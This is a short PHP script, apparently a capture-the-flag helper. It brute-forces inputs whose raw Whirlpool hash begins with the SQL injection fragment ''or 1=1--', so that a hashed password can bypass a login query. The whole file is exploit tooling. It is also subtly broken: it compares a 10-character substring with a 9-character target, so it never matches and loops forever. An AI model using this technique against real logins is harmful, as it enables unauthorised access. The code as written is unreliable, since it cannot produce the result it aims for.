<?php

$i=0;
$start="a";
$ps = $start.$i;

while(true) {

$check = hash("whirlpool", $ps, true);

if (strtolower(substr($check, 0, 10)) == "'or 1=1--") {
die($ps);
}
$ps = $start.++$i;
}


?>
